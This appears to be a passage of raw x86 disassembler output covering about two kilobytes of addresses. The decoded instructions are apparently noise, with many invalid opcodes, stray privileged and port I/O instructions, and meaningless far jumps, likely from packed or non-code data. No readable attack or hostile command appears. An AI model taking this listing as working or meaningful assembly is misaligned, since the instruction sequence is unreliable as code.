  405361:	add    edx,DWORD PTR [edi-0x359d1b05]
  405367:	gs int3 
  405369:	out    0xe6,eax
  40536b:	stos   DWORD PTR es:[edi],eax
  40536c:	(bad)
  40536f:	repnz pop eax
  405371:	addr16 gs jns 0x4053d1
  405375:	mov    ebx,0x1cdec1ad
  40537a:	push   ss
  40537b:	push   ecx
  40537c:	lods   al,BYTE PTR ds:[esi]
  40537d:	jmp    0x40537a
  40537f:	ins    DWORD PTR es:[edi],dx
  405380:	pop    es
  405381:	pop    esp
  405382:	xchg   BYTE PTR [esp+edx*1+0x31bee5cb],ah
  405389:	sbb    bl,dl
  40538b:	pop    es
  40538c:	pop    eax
  40538d:	adc    eax,0xe128447
  405392:	(bad)  
  405394:	repz mov ds:0x95b1752e,eax
  40539a:	(bad)  
  40539b:	sti    
  40539c:	push   0xa000492c
  4053a1:	mov    bh,BYTE PTR [ebx-0x1b61ab18]
  4053a7:	mov    ebp,0xf4e73884
  4053ac:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ae:	ds push edx
  4053b0:	sbb    bl,BYTE PTR [edi-0x2809f2ae]
  4053b6:	pop    edx
  4053b7:	mov    al,0x9b
  4053b9:	dec    edx
  4053ba:	inc    edx
  4053bb:	(bad)  
  4053bc:	je     0x405352
  4053be:	ret    0xc45
  4053c1:	mov    bl,0x87
  4053c3:	enter  0x27d2,0xd4
  4053c7:	push   ebp
  4053c8:	cmp    bh,ah
  4053ca:	imul   DWORD PTR [edi]
  4053cc:	fdiv   DWORD PTR gs:[edx-0x1279fba8]
  4053d3:	xor    al,0x4f
  4053d5:	push   0x36
  4053d7:	jns    0x405457
  4053d9:	loop   0x4053e2
  4053db:	mov    al,0x43
  4053dd:	jmp    0xa279:0xc83a4a4
  4053e4:	pop    ebp
  4053e5:	in     al,dx
  4053e6:	inc    esi
  4053e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053e8:	ins    BYTE PTR es:[edi],dx
  4053e9:	cmp    eax,DWORD PTR [edx+0x3fa27209]
  4053ef:	stos   DWORD PTR es:[edi],eax
  4053f0:	mov    dl,BYTE PTR [eax-0x71fffb76]
  4053f6:	jmp    0x121d:0x3b589be6
  4053fd:	aad    0xf
  4053ff:	add    cl,cl
  405401:	jle    0x4053d6
  405403:	xor    eax,0x7f37489f
  405408:	into   
  405409:	push   edx
  40540a:	pop    ecx
  40540b:	fcmovnu st,st(1)
  40540d:	xchg   edi,eax
  40540e:	dec    ebp
  40540f:	mov    dl,0x14
  405411:	sbb    ebp,DWORD PTR [esi+ecx*1+0x4d]
  405415:	jge    0x40539f
  405417:	int    0xdc
  405419:	sub    BYTE PTR [edi],cl
  40541b:	das    
  40541c:	xrelease xchg BYTE PTR [edx+edx*4],dh
  405420:	mov    ?,WORD PTR [edx-0x37]
  405423:	add    eax,0x4037ca2a
  405428:	ret    0xba16
  40542b:	mov    bh,0x4f
  40542d:	(bad)  
  40542e:	or     BYTE PTR [edi-0x29],bl
  405431:	nop
  405432:	out    dx,al
  405433:	mov    ebx,0xe44ca149
  405438:	pop    edi
  405439:	inc    ebp
  40543a:	ds or  edx,ebx
  40543d:	xchg   esp,eax
  40543e:	xor    eax,DWORD PTR [edi+0x2a]
  405441:	jae    0x405480
  405443:	mov    ah,0xd
  405445:	cld    
  405446:	stc    
  405447:	jmp    0xc56c:0xeb44b03f
  40544e:	test   BYTE PTR [eax+eax*4+0x5699fd7e],al
  405455:	inc    ebx
  405456:	mov    ds:0x22679af3,eax
  40545b:	icebp  
  40545c:	mov    DWORD PTR [edi+0x7ef29435],ebx
  405462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405463:	cmp    DWORD PTR [bx+di],0x36f7f7b1
  40546a:	sub    BYTE PTR [edi+edx*2+0x1f76bc00],dh
  405471:	mov    ecx,0x8083aee3
  405476:	ror    BYTE PTR [edx+0x3eb6aa05],0xe4
  40547d:	psubusb mm1,QWORD PTR [edx+0x62f08426]
  405484:	inc    ebp
  405485:	jg     0x4054ac
  405487:	(bad)  
  405489:	and    DWORD PTR [edx],edx
  40548b:	mov    ?,esp
  40548d:	jmp    0xcd6172a3
  405492:	dec    ecx
  405493:	and    eax,0xd679fd32
  405498:	xor    ebp,edx
  40549a:	out    0xe4,eax
  40549c:	and    al,0xfc
  40549e:	or     eax,0xc29cd511
  4054a3:	pop    ecx
  4054a4:	in     eax,0x4e
  4054a6:	xchg   esi,eax
  4054a7:	adc    dl,BYTE PTR [ecx+0x1cb85f7f]
  4054ad:	mov    ds:0x5f9bed39,al
  4054b2:	je     0x405499
  4054b4:	xchg   ebp,eax
  4054b5:	cld    
  4054b6:	out    dx,eax
  4054b7:	adc    bh,bh
  4054b9:	rcr    ebp,0xe1
  4054bc:	fild   DWORD PTR [edx+0x59]
  4054bf:	sti    
  4054c0:	fld    st(6)
  4054c2:	xor    edx,DWORD PTR [ecx]
  4054c4:	xchg   edi,eax
  4054c5:	dec    edx
  4054c6:	inc    eax
  4054c7:	push   0x1d
  4054c9:	pop    edx
  4054ca:	popa   
  4054cb:	cmp    ebp,0xd0c6c72c
  4054d1:	xchg   edi,eax
  4054d2:	and    al,0x19
  4054d4:	pop    eax
  4054d5:	js     0x4054fa
  4054d7:	cli    
  4054d8:	pop    eax
  4054d9:	or     eax,0x4ca4fe5a
  4054de:	ficom  DWORD PTR [eax+0x56]
  4054e1:	mov    dh,0x5e
  4054e3:	jp     0x40550b
  4054e5:	ds loopne 0x40549e
  4054e8:	adc    DWORD PTR [ebp-0x7d],0xffffffde
  4054ec:	cdq    
  4054ed:	push   ebp
  4054ee:	sbb    DWORD PTR [ebp-0x4337ff50],ecx
  4054f4:	cwde   
  4054f5:	imul   eax,DWORD PTR [ebp*8-0x2bec5dcf],0xe134e31b
  405500:	mov    dh,0x16
  405502:	ds ret 
  405504:	cmp    ecx,ecx
  405506:	bound  ebp,QWORD PTR [edx]
  405508:	cmp    BYTE PTR [edx+0x6b6ae123],0x1c
  40550f:	adc    bh,BYTE PTR [ebx]
  405511:	fcomp  QWORD PTR [esi-0x8]
  405514:	sbb    dl,cl
  405516:	arpl   WORD PTR [ebx],bx
  405518:	mov    BYTE PTR [esi-0x24d251f],cl
  40551e:	pop    edi
  40551f:	iret   
  405520:	dec    esp
  405521:	fnstcw WORD PTR [eax+0x25]
  405524:	mov    dh,BYTE PTR [ecx+0x61]
  405527:	test   BYTE PTR [esi+0x15934b00],ah
  40552d:	loop   0x405509
  40552f:	mov    dh,0xfe
  405531:	scas   al,BYTE PTR es:[edi]
  405532:	pop    eax
  405533:	sub    al,0x67
  405535:	jg     0x4054dc
  405537:	and    bh,BYTE PTR [ebx]
  405539:	push   ss
  40553a:	int3   
  40553b:	adc    eax,esp
  40553d:	outs   dx,DWORD PTR ds:[esi]
  40553e:	mov    bh,0x24
  405540:	push   ds
  405541:	jecxz  0x405596
  405543:	div    edx
  405545:	jge    0x405576
  405547:	pop    edx
  405548:	sbb    al,0x55
  40554a:	fbld   TBYTE PTR [eax+0x2c]
  40554d:	mov    al,0x64
  40554f:	xchg   ebx,eax
  405550:	fist   WORD PTR ds:0xae3bc01d
  405556:	cmp    BYTE PTR [eax-0x5e],dh
  405559:	data16 fidivr DWORD PTR [eax-0x64]
  40555d:	loop   0x405543
  40555f:	fnstenv [esi+eax*8-0x5ab4177d]
  405566:	stos   BYTE PTR es:[edi],al
  405567:	shl    BYTE PTR [ebx-0x7e424996],1
  40556d:	mov    ecx,0x1e819b92
  405572:	aam    0xc0
  405574:	mov    cl,0x4b
  405576:	repz inc ebx
  405578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405579:	push   edx
  40557a:	xor    eax,0x4afee84b
  40557f:	jp     0x40559a
  405581:	add    eax,DWORD PTR [eax+0x25cea9ff]
  405587:	cmp    eax,0x8326a400
  40558c:	pop    ebp
  40558d:	int3   
  40558e:	xlat   BYTE PTR ds:[ebx]
  40558f:	and    bl,BYTE PTR [edi+edx*4]
  405592:	xor    ch,BYTE PTR [ebp+0x369f5ec6]
  405598:	imul   esi,DWORD PTR [esi+0x6865883],0xdbd754c4
  4055a2:	inc    eax
  4055a3:	test   eax,0x3eaca96b
  4055a8:	sub    eax,ecx
  4055aa:	add    DWORD PTR [ebp+0x13d9bd64],edi
  4055b0:	xor    BYTE PTR [edi+0x13],dl
  4055b3:	loope  0x4055f8
  4055b5:	fcomp  QWORD PTR [esi+edx*8+0x536f81d3]
  4055bc:	inc    eax
  4055bd:	test   DWORD PTR [edi-0x59bd5efd],0x7f2ade98
  4055c7:	mov    eax,ds:0x73ce5c56
  4055cc:	pop    edi
  4055cd:	(bad)  
  4055ce:	aas    
  4055cf:	shr    BYTE PTR [edi],cl
  4055d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055d2:	out    0xb0,eax
  4055d4:	aad    0x2d
  4055d6:	xor    bl,cl
  4055d8:	mov    al,ds:0x1b12a214
  4055dd:	fcmovu st,st(7)
  4055df:	or     edi,DWORD PTR [esi-0x71]
  4055e2:	jmp    0xbfc3f47b
  4055e7:	jnp    0x4055f3
  4055e9:	or     al,BYTE PTR [ecx]
  4055eb:	mov    esi,0x5da05b37
  4055f0:	rcr    DWORD PTR [ecx+0x2136ad57],0x9b
  4055f7:	xor    dh,BYTE PTR [esi+0x19]
  4055fa:	jmp    0x19cbff8c
  4055ff:	outs   dx,BYTE PTR ds:[esi]
  405600:	push   0xd11eefe1
  405605:	and    ah,BYTE PTR [ebp+ecx*4+0x23305a35]
  40560c:	dec    esp
  40560d:	cwde   
  40560e:	clc    
  40560f:	fsubr  DWORD PTR [ecx]
  405611:	sub    eax,eax
  405613:	ret    0x344c
  405616:	push   edi
  405617:	mov    eax,DWORD PTR ds:0xf3c964e3
  40561d:	and    BYTE PTR [ebp-0x65c5b64],dl
  405623:	pushf  
  405624:	ss push ebp
  405626:	stos   DWORD PTR es:[edi],eax
  405627:	(bad)  
  405628:	popf   
  405629:	neg    DWORD PTR [edx]
  40562b:	adc    eax,0xe984cb87
  405630:	push   esi
  405631:	scas   eax,DWORD PTR es:[edi]
  405632:	test   al,0x97
  405634:	aaa    
  405635:	ds call 0xcd81:0x2725dde1
  40563d:	nop
  40563e:	out    0x47,eax
  405640:	scas   al,BYTE PTR es:[edi]
  405641:	les    esp,FWORD PTR [edx+esi*8-0x4f]
  405645:	nop
  405646:	pop    es
  405647:	(bad)  gs:[ecx-0x2691952c]
  40564e:	adc    dh,BYTE PTR [eax+eax*8]
  405651:	or     edx,DWORD PTR [ebp+0x590bc768]
  405657:	adc    edx,DWORD PTR [esi-0x1f]
  40565a:	push   ecx
  40565b:	push   0xd9d61241
  405660:	fsub   DWORD PTR [esi-0x51]
  405663:	jo     0x40568c
  405665:	lods   al,BYTE PTR ds:[esi]
  405666:	mov    esp,DWORD PTR [edi-0x7e149684]
  40566c:	loope  0x405681
  40566e:	push   eax
  40566f:	out    0xda,eax
  405671:	ror    DWORD PTR [ebx-0x475d0540],cl
  405677:	sub    eax,ecx
  405679:	div    DWORD PTR [ebp-0x30]
  40567c:	test   eax,0x806704da
  405681:	adc    BYTE PTR [ecx-0x47c3079c],bh
  405687:	int    0xf1
  405689:	ret    
  40568a:	jp     0x405678
  40568c:	mov    eax,ds:0x966944b7
  405691:	xor    edi,DWORD PTR [edx]
  405693:	je     0x405694
  405695:	lods   eax,DWORD PTR ds:[esi]
  405696:	xchg   edx,eax
  405697:	dec    esp
  405698:	cmp    esp,0x8b976eb1
  40569e:	adc    BYTE PTR [ecx],dl
  4056a0:	mov    dh,BYTE PTR [eax]
  4056a2:	stc    
  4056a3:	inc    eax
  4056a4:	popa   
  4056a5:	imul   edx,DWORD PTR [eax],0x629a2e57
  4056ab:	jo     0x4056b6
  4056ad:	jp     0x4056d5
  4056af:	dec    ecx
  4056b0:	(bad)  
  4056b1:	shr    ah,0x47
  4056b4:	pushf  
  4056b5:	cld    
  4056b6:	dec    esp
  4056b7:	lods   eax,DWORD PTR ds:[esi]
  4056b8:	daa    
  4056b9:	imul   edi,DWORD PTR [edi-0x5e],0x9bcc38e6
  4056c0:	cli    
  4056c1:	stos   DWORD PTR es:[edi],eax
  4056c2:	pop    ebx
  4056c3:	push   esi
  4056c4:	dec    esi
  4056c5:	rol    BYTE PTR [edx+0x17ec8486],0x36
  4056cc:	retf   0xe02d
  4056cf:	push   ds
  4056d0:	(bad)  
  4056d1:	in     eax,dx
  4056d2:	or     BYTE PTR [ebx+0x26],ah
  4056d5:	fadd   st(0),st
  4056d7:	stos   DWORD PTR es:[edi],eax
  4056d8:	out    0xff,al
  4056da:	sub    edi,DWORD PTR [ebx]
  4056dc:	fstp   QWORD PTR [esi+0x2d]
  4056df:	dec    edi
  4056e0:	fldenv [ebx]
  4056e2:	push   ds
  4056e3:	adc    al,0x2
  4056e5:	or     eax,0x4b400bc
  4056ea:	inc    edx
  4056eb:	cmp    eax,DWORD PTR [edi+0x46]
  4056ee:	shl    DWORD PTR [eax-0x26214af5],1
  4056f4:	and    ebx,DWORD PTR [edx+eiz*4-0x5b]
  4056f8:	aas    
  4056f9:	ret    0x356d
  4056fc:	jecxz  0x405763
  4056fe:	pop    ds
  4056ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405700:	push   ebp
  405701:	mov    BYTE PTR [ecx-0x2a],cl
  405704:	ret    
  405705:	fild   DWORD PTR [edi-0xd]
  405708:	ds cld 
  40570a:	repz daa 
  40570c:	faddp  st(6),st
  40570e:	scas   al,BYTE PTR es:[edi]
  40570f:	rcl    DWORD PTR [ebx],cl
  405711:	mov    ebx,0x255c98ee
  405716:	aam    0xd5
  405718:	inc    eax
  405719:	lea    ebp,[edi]
  40571b:	pop    ecx
  40571c:	dec    edi
  40571d:	cmp    BYTE PTR [ebx+0x7e],ah
  405720:	fmul   QWORD PTR [edx-0x3534e61b]
  405726:	sti    
  405727:	loope  0x40575d
  405729:	xlat   BYTE PTR ds:[ebx]
  40572a:	xlat   BYTE PTR ds:[ebx]
  40572b:	mov    eax,0x58844f04
  405730:	add    dl,BYTE PTR [edx+ebx*1-0x6bc3807a]
  405737:	or     ah,BYTE PTR [edi-0x3b]
  40573a:	std    
  40573b:	(bad)  
  40573d:	iret   
  40573e:	add    BYTE PTR [edx-0x37b2ab54],cl
  405744:	outs   dx,DWORD PTR ds:[esi]
  405745:	or     BYTE PTR [edx-0x42],bh
  405748:	cld    
  405749:	js     0x4056f1
  40574b:	xor    bl,BYTE PTR [edx]
  40574d:	and    BYTE PTR [esi-0x51],dl
  405750:	cmc    
  405751:	call   0x47105392
  405756:	stos   DWORD PTR es:[edi],eax
  405757:	or     DWORD PTR [ecx],edx
  405759:	arpl   WORD PTR [eax],di
  40575b:	std    
  40575c:	(bad)  
  40575d:	xchg   ecx,eax
  40575e:	(bad)  
  40575f:	aam    0x13
  405761:	jnp    0x405744
  405763:	(bad)  
  405764:	data16 (bad) 
  405766:	pop    ds
  405767:	xor    al,0xab
  405769:	jb     0x40579b
  40576b:	outs   dx,BYTE PTR ds:[esi]
  40576c:	arpl   WORD PTR [esp+eiz*8],ax
  40576f:	enter  0x8711,0xb5
  405773:	mov    ?,WORD PTR [ecx-0x41]
  405776:	in     eax,dx
  405777:	jne    0x4057d0
  405779:	adc    eax,DWORD PTR [ecx-0x22]
  40577c:	jl     0x2b81774b
  405782:	jno    0x40579f
  405784:	inc    ecx
  405785:	or     esp,DWORD PTR [eax]
  405787:	mov    eax,ds:0x82556522
  40578c:	dec    esp
  40578d:	sub    ebx,DWORD PTR ds:0xadedab5c
  405793:	mov    al,BYTE PTR [eax+0x75]
  405796:	or     eax,0xa737ebeb
  40579b:	pop    ebx
  40579c:	(bad)  
  40579d:	and    BYTE PTR [ebx+0x6a],dh
  4057a0:	sbb    eax,0xc67df5f3
  4057a5:	inc    ebp
  4057a6:	frstor [ebx]
  4057a8:	pusha  
  4057a9:	mov    eax,0x6bbb3bca
  4057ae:	pop    ebp
  4057af:	dec    DWORD PTR [edi+0x2cf65903]
  4057b5:	jae    0x4057f7
  4057b7:	clc    
  4057b8:	out    0xc1,al
  4057ba:	es dec esp
  4057bc:	lock out 0x39,eax
  4057bf:	imul   ebx,DWORD PTR [eax+0x580708e4],0xe07dd3f
  4057c9:	xchg   edi,eax
  4057ca:	jae    0x40575d
  4057cc:	imul   esp,DWORD PTR [eax],0xd31c75ba
  4057d2:	es iret 
  4057d4:	dec    ebx
  4057d5:	js     0x40581e
  4057d7:	retf   
  4057d8:	lahf   
  4057d9:	xchg   edx,eax
  4057da:	cwde   
  4057db:	jnp    0x4057cb
  4057dd:	(bad)  
  4057de:	and    ch,BYTE PTR [ebx]
  4057e0:	jg     0x40579f
  4057e2:	scas   al,BYTE PTR es:[edi]
  4057e3:	inc    edi
  4057e4:	cmp    BYTE PTR [ebx+0x43],bl
  4057e7:	adc    BYTE PTR [edx+eiz*8],al
  4057ea:	cmp    DWORD PTR [ecx+0x1f9b9a0b],0x3e7d626d
  4057f4:	loope  0x4057d6
  4057f6:	les    ebp,FWORD PTR [edi+0xf]
  4057f9:	retf   0x3340
  4057fc:	jg     0x4057fc
  4057fe:	add    dh,BYTE PTR [edx]
  405800:	xchg   edx,eax
  405801:	fdivp  st(1),st
  405803:	dec    edi
  405804:	sbb    ebx,DWORD PTR fs:[eax-0x5]
  405808:	pop    eax
  405809:	stos   DWORD PTR es:[edi],eax
  40580a:	(bad)  
  40580b:	jmp    0x405882
  40580d:	sbb    DWORD PTR [edx-0x65],ecx
  405810:	neg    DWORD PTR [edi-0x633c139f]
  405816:	loop   0x4057d1
  405818:	lods   al,BYTE PTR ds:[esi]
  405819:	push   0xffffff80
  40581b:	lods   al,BYTE PTR ds:[esi]
  40581c:	sbb    DWORD PTR [esi-0x7e8c0911],esi
  405822:	sub    dh,BYTE PTR [edx+esi*2-0x693afafe]
  405829:	cli    
  40582a:	ror    edx,0xbc
  40582d:	push   eax
  40582e:	jno    0x4057f4
  405830:	dec    edi
  405831:	dec    edx
  405832:	hlt    
  405833:	lds    ecx,FWORD PTR [ecx-0x66d94da7]
  405839:	mov    ds:0xcc1fc40c,al
  40583e:	sub    BYTE PTR [ecx-0x12],dh
  405841:	dec    esp
  405842:	mov    edi,0x9a88fe35
  405847:	xor    al,0x5b
  405849:	retf   
  40584a:	cmp    BYTE PTR [esp+ebp*1-0x74],dh
  40584e:	fisubr WORD PTR [ecx-0x3b]
  405851:	pop    ebp
  405852:	(bad)  [ecx]
  405854:	cmpxchg BYTE PTR [ebx],ah
  405857:	scas   al,BYTE PTR es:[edi]
  405858:	into   
  405859:	mov    edi,0x7d74757c
  40585e:	and    BYTE PTR [esi+0x73dbce62],0x68
  405865:	or     DWORD PTR [esi+0x6d78361f],esp
  40586b:	mov    ds:0xa8dddb3b,al
  405870:	in     al,dx
  405871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405872:	pop    ss
  405873:	cmp    eax,0xdb924fd
  405878:	fbstp  TBYTE PTR [edx+0x72dbfa8c]
  40587e:	arpl   si,cx
  405880:	jg     0x405846
  405882:	out    0xb3,al
  405884:	mov    DWORD PTR [ecx+0x27],ebx
  405887:	retf   0xbbd4
  40588a:	dec    ecx
  40588b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40588d:	xchg   esp,eax
  40588e:	push   ebx
  40588f:	retf   0xf407
  405892:	jo     0x4058dc
  405894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405895:	loop   0x4058a2
  405897:	cmc    
  405898:	pushf  
  405899:	push   ebp
  40589a:	mov    edx,0xc154a81e
  40589f:	das    
  4058a0:	push   ss
  4058a1:	and    edi,esi
  4058a3:	push   ebp
  4058a4:	pop    ecx
  4058a5:	mov    eax,0x577b479e
  4058aa:	sahf   
  4058ab:	xor    ebx,DWORD PTR [edi+ecx*1+0x135ae82b]
  4058b2:	sub    ecx,ebp
  4058b4:	shr    BYTE PTR [ebx-0x60],0x30
  4058b8:	nop
  4058b9:	cli    
  4058ba:	aad    0x38
  4058bc:	stos   BYTE PTR es:[edi],al
  4058bd:	inc    edx
  4058be:	add    ebx,DWORD PTR [eax-0x6fa6ec68]
  4058c4:	pop    eax
  4058c5:	xor    DWORD PTR [edi+0x36],ecx
  4058c8:	mov    BYTE PTR [ebx],bh
  4058ca:	(bad)  
  4058cb:	sbb    edx,DWORD PTR [edi+0x4e9fdb48]
  4058d1:	dec    ebx
  4058d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058d4:	sahf   
  4058d5:	dec    edx
  4058d6:	xor    DWORD PTR [ebx+0x45],0xe8d93452
  4058dd:	and    edi,DWORD PTR [ecx-0x55b7a50]
  4058e3:	mov    ecx,0x8a970c1b
  4058e8:	(bad)  
  4058e9:	push   esp
  4058ea:	and    eax,ebx
  4058ec:	outs   dx,BYTE PTR ds:[esi]
  4058ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058ee:	jl     0x40594f
  4058f0:	push   es
  4058f1:	imul   ebp,edx,0xffffffcc
  4058f4:	pop    ds
  4058f5:	ins    DWORD PTR es:[edi],dx
  4058f6:	xchg   esi,eax
  4058f7:	lea    edx,[esp+edi*1+0x1817ed72]
  4058fe:	inc    eax
  4058ff:	xchg   esi,eax
  405900:	push   es
  405901:	popf   
  405902:	scas   eax,DWORD PTR es:[edi]
  405903:	mov    ebx,0xa602490a
  405908:	xor    eax,0xc04763d4
  40590d:	and    al,0xef
  40590f:	push   ebx
  405910:	and    dh,BYTE PTR ds:0xf126a316
  405916:	sti    
  405917:	in     al,0xfe
  405919:	mov    al,0xc8
  40591b:	stos   DWORD PTR es:[edi],eax
  40591c:	xor    edi,ecx
  40591e:	pop    ds
  40591f:	sbb    dh,BYTE PTR [eax+0x7e]
  405922:	popa   
  405923:	cmp    eax,0x48047e7
  405928:	cwde   
  405929:	push   ebx
  40592a:	out    dx,al
  40592b:	mov    eax,0x3230e0bd
  405930:	js     0x4058e3
  405932:	mov    ds:0x3cdc36a8,eax
  405937:	xchg   esi,eax
  405938:	aaa    
  405939:	retf   
  40593a:	jl     0x4058cd
  40593c:	int3   
  40593d:	lods   al,BYTE PTR ds:[esi]
  40593e:	dec    ebp
  40593f:	call   0x5ea9:0xa1b21f20
  405946:	and    cl,dl
  405948:	mov    ds:0x8ee589ec,eax
  40594d:	or     ah,BYTE PTR [eax-0x42291331]
  405953:	dec    eax
  405954:	icebp  
  405955:	rcr    BYTE PTR [ebx],cl
  405957:	pusha  
  405958:	xlat   BYTE PTR ds:[ebx]
  405959:	dec    esi
  40595a:	test   DWORD PTR [eax-0xb],edi
  40595d:	(bad)  
  40595e:	dec    ebx
  40595f:	jmp    0x329d:0x4791acc
  405966:	imul   edx,DWORD PTR [ebx-0x21],0x287b97f1
  40596d:	jb     0x405948
  40596f:	test   al,0x82
  405971:	sub    ah,BYTE PTR [ebx+ebx*8+0x6c]
  405975:	sbb    BYTE PTR [ebx+0x4a],bh
  405978:	pop    eax
  405979:	cmp    eax,esp
  40597b:	retf   
  40597c:	es (bad) 
  40597e:	mov    ecx,cs
  405980:	jge    0x405945
  405982:	data16 in al,0xe0
  405985:	inc    eax
  405986:	ins    BYTE PTR es:[edi],dx
  405987:	pop    ss
  405988:	fmul   DWORD PTR ds:0x6ba2a9c2
  40598e:	call   0xd778102c
  405993:	cdq    
  405994:	idiv   DWORD PTR [ebx-0x22]
  405997:	iret   
  405998:	add    al,BYTE PTR [ecx]
  40599a:	ret    
  40599b:	mov    edx,ebp
  40599d:	sti    
  40599e:	scas   al,BYTE PTR es:[edi]
  40599f:	pushf  
  4059a0:	add    edi,DWORD PTR [esp+ebx*2-0x3d]
  4059a4:	fwait
  4059a5:	dec    esp
  4059a6:	mov    ds:0xe4f8e144,al
  4059ab:	neg    BYTE PTR [eax+eiz*8]
  4059ae:	xchg   DWORD PTR [esi+esi*2+0x72c0d9db],edi
  4059b5:	ret    
  4059b6:	xlat   BYTE PTR ds:[ebx]
  4059b7:	(bad)  
  4059b8:	stos   BYTE PTR es:[edi],al
  4059b9:	mov    ebx,0xc3114f7f
  4059be:	mov    ebx,0x26112d68
  4059c3:	cmp    esi,DWORD PTR [edx-0x5d]
  4059c6:	outs   dx,BYTE PTR ds:[esi]
  4059c7:	jo     0x40599d
  4059c9:	std    
  4059ca:	pop    esi
  4059cb:	mov    ds:0xcaf95c1,al
  4059d0:	outs   dx,DWORD PTR ds:[esi]
  4059d1:	dec    edx
  4059d2:	sub    eax,0x12212466
  4059d7:	fcmovnbe st,st(6)
  4059d9:	nop
  4059da:	fdivr  QWORD PTR [esi+0x24f38044]
  4059e0:	xor    al,0x2a
  4059e2:	sbb    cl,dl
  4059e4:	sbb    BYTE PTR [ebp-0x62698848],0x70
  4059eb:	jnp    0x405a3d
  4059ed:	popa   
  4059ee:	sub    DWORD PTR [edx],ebx
  4059f0:	rcl    DWORD PTR [eax],0x81
  4059f3:	inc    edx
  4059f4:	push   ss
  4059f5:	leave  
  4059f6:	mov    cl,0x68
  4059f8:	adc    bl,0xb0
  4059fb:	dec    esp
  4059fc:	imul   edi,edi,0x30e6376b
  405a02:	je     0x4059d9
  405a04:	test   eax,0x1b8bcf72
  405a09:	sti    
  405a0a:	aas    
  405a0b:	mov    esp,0x23a4d995
  405a10:	or     esp,ecx
  405a12:	pop    edi
  405a13:	adc    esi,DWORD PTR ss:0xc21b4817
  405a1a:	addr16 inc ecx
  405a1c:	loope  0x405a52
  405a1e:	int    0x62
  405a20:	sub    dl,BYTE PTR [edx+0x56c81195]
  405a26:	cmp    edi,DWORD PTR [eax+0x4]
  405a29:	mov    eax,ds:0xe71b8a2a
  405a2e:	mov    ds:0xa89c1a33,eax
  405a33:	mov    al,ds:0x3392dc22
  405a38:	arpl   WORD PTR [edx-0xb4ab995],si
  405a3e:	mov    al,ds:0xb66dec65
  405a43:	or     bl,ah
  405a45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a46:	sub    DWORD PTR [edx-0x1e28ee85],ebp
  405a4c:	nop
  405a4d:	jne    0x4059e6
  405a4f:	pop    es
  405a50:	cmp    ah,dl
  405a52:	inc    esi
  405a53:	sbb    BYTE PTR [ecx],0xbe
  405a56:	fsub   DWORD PTR [edi-0x74688b9f]
  405a5c:	pop    es
  405a5d:	xchg   ebp,eax
  405a5e:	lods   eax,DWORD PTR ds:[esi]
  405a5f:	adc    ecx,DWORD PTR [esp+ecx*2]
  405a62:	jmp    0x4059e6
  405a64:	jns    0x405a38
  405a66:	jg     0x405a88
  405a68:	out    0xe7,eax
  405a6a:	xchg   esp,eax
  405a6b:	mov    ch,0x90
  405a6d:	sub    ecx,DWORD PTR [ebx-0x71727841]
  405a73:	mov    edi,0xde1c0c60
  405a78:	add    bl,bh
  405a7a:	cmp    BYTE PTR [eax+0x56],dh
  405a7d:	mov    ebx,0x72657127
  405a82:	jbe    0x405a36
  405a84:	call   0x8c4c:0xfaa104b4
  405a8b:	push   0xffffffc3
  405a8d:	jno    0x405a78
  405a8f:	jp     0x405a46
  405a91:	sub    WORD PTR [ebp+0x45],bp
  405a95:	mov    DWORD PTR [esi+0x1286e5ad],edi
  405a9b:	into   
  405a9c:	pop    edx
  405a9d:	mul    edx
  405a9f:	imul   ebx,DWORD PTR [ebx+0x39ed269],0x28199d92
  405aa9:	rcr    esi,1
  405aab:	inc    edi
  405aac:	inc    esp
  405aad:	cmp    eax,0x63618537
  405ab2:	jns    0x405a4b
  405ab4:	outs   dx,DWORD PTR ds:[esi]
  405ab5:	push   es
  405ab6:	shl    DWORD PTR [ebx+0x5eb1d78],1
  405abc:	mov    ecx,0xf7719a4c
  405ac1:	ja     0x405b37
  405ac3:	pop    edi
  405ac4:	sbb    al,0xf8
  405ac6:	mov    edx,0x45e02c15
  405acb:	fbstp  TBYTE PTR [eax+0x9e6f13]
  405ad1:	aam    0xec
  405ad3:	sub    dl,ch
  405ad5:	inc    eax
  405ad6:	in     eax,dx
  405ad7:	pop    ebx
  405ad8:	or     al,0x1
  405ada:	push   edx
  405adb:	mov    eax,ds:0x85fa4b
  405ae0:	xor    DWORD PTR [eax],ebx
  405ae2:	add    bh,dh
  405ae4:	(bad)  
  405ae5:	jne    0x405a6f
  405ae7:	xchg   ecx,eax
  405ae8:	arpl   bx,bp
  405aea:	mov    dl,0xf6
  405aec:	jmp    ecx
  405aee:	inc    ebp
  405aef:	shl    DWORD PTR [esi-0x5f],0x18
  405af3:	scas   eax,DWORD PTR es:[edi]
  405af4:	leave  
  405af5:	mov    cl,0xa7
  405af7:	out    dx,al
  405af8:	mov    bl,BYTE PTR [ecx+ebp*2]
  405afb:	sbb    al,0x91
  405afd:	lea    eax,[ebp+ebx*8-0x19]
  405b01:	mov    es:0x5b3c8110,eax
  405b07:	arpl   bx,ax
  405b09:	aam    0x3f
  405b0b:	xor    eax,0xcf8d8700
  405b10:	(bad)  
  405b11:	fs cmc 
  405b13:	cld    
  405b14:	xor    ah,al
  405b16:	sbb    DWORD PTR [edx-0x71fa2d17],eax
  405b1c:	mov    ebx,0x137c1037
  405b21:	sbb    al,0x3
  405b23:	jp     0x405b79
  405b25:	mov    ebp,0x58ce69f5
  405b2a:	(bad)  
  405b2b:	jns    0x405ac7
  405b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b2e:	out    0xf9,al
  405b30:	or     DWORD PTR [edx+0x59],ebp
  405b33:	xchg   esi,eax
  405b34:	xor    al,0x15
  405b36:	pop    ss
  405b37:	add    bl,cl
  405b39:	rol    DWORD PTR [ebx+eax*8],1
  405b3c:	mov    dh,0xc2
  405b3e:	mov    ebx,0x5e22465
  405b43:	enter  0xc021,0x46
